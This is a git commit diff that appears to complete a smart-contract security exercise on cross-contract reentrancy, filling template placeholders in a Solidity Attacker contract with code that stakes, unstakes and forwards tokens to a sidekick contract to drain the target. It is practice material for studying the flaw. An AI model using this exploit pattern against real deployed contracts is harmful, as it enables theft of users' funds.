3b4be192d8367ded5bed3d41979b5db9a98a9f7f
ikcoin <ikcoin.kb@protonmail.com>
2023-05-16 12:08:34 +0200

    03 Cross contract reentrancy

--- src/03-template_attacker.sol
+++ src/03-template_attacker.sol
@@ -4,44 +4,47 @@ pragma solidity ^0.8.13;
 import "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
 import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
-
 interface IVulnerable {
     function stake() external payable;
-    function unstake() external;	
+
+    function unstake() external;
 }
 
 interface ISidekick {
-	function exploit() external payable;
+    function exploit() external payable;
 }
 
 contract Attacker {
-	
-	using SafeERC20 for IERC20;
+    using SafeERC20 for IERC20;
 
-	IVulnerable public target;
-	IERC20 public token;
-	ISidekick public sidekick;
-	
-	constructor(address _target, address tkn) {
-		target = IVulnerable(_target);
-		token = IERC20(tkn);
-	}
+    IVulnerable public target;
+    IERC20 public token;
+    ISidekick public sidekick;
 
-    
-	function setSidekick(address _sidekick) public {
-		sidekick = ISidekick(_sidekick);
-	}
+    uint256 public counter;
+
+    constructor(address _target, address tkn) {
+        target = IVulnerable(_target);
+        token = IERC20(tkn);
+    }
+
+    function setSidekick(address _sidekick) public {
+        sidekick = ISidekick(_sidekick);
+    }
 
     receive() external payable {
-        
-        /*
-            Your code goes here!
-        */
+        uint256 tokenBalance = token.balanceOf(address(this));
+        token.transfer(address(sidekick), tokenBalance);
     }
 
     function exploit() public payable {
-        /*
-            Your code goes here!
-        */
-    }  
+        // Deposit funds
+        target.stake{value: 1 ether}();
+
+        target.unstake();
+
+        if (address(target).balance > 0) {
+            sidekick.exploit();
+        }
+    }
 }
